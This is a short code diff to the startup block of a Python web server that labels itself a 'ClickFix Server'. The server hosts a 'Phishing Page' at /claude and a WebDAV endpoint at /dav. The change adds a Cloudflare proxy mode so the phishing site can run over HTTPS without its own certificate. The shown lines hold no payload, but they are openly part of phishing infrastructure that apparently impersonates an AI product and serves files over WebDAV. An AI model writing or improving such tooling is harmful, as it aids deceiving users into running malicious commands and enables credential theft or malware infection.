@@ -159,13 +159,26 @@ async def options_root():
 # ====================== START ======================
 if __name__ == "__main__":
     server_cfg = config.get("server", {})
+    cloudflare_cfg = config.get("cloudflare", {})
+    
     host = server_cfg.get("host", "0.0.0.0")
-    port = server_cfg.get("port", 8080)
+    port = server_cfg.get("port", 80)
+    
+    # Check if behind Cloudflare
+    is_cloudflare = cloudflare_cfg.get("enabled", False)
+    
+    protocol = "https" if is_cloudflare else "http"
     
     print("="*70)
     print("ClickFix Server Started!")
-    print(f"-> Phishing Page : http://{host}:{port}/claude")
-    print(f"-> WebDAV        : http://{host}:{port}/dav")
+    print(f"-> Mode: {'Cloudflare (HTTPS)' if is_cloudflare else 'Local (HTTP)'}")
+    print(f"-> Phishing Page : {protocol}://{host}:{port}/claude")
+    print(f"-> WebDAV        : {protocol}://{host}:{port}/dav")
     print("="*70)
     
-    uvicorn.run(app, host=host, port=port)
+    if is_cloudflare:
+        # Cloudflare handles SSL, server runs plain HTTP on 443
+        print("[*] Cloudflare mode - SSL handled by proxy")
+        print("[*] No cert needed on server")
+    
+    uvicorn.run(app, host=host, port=port, reload=False)
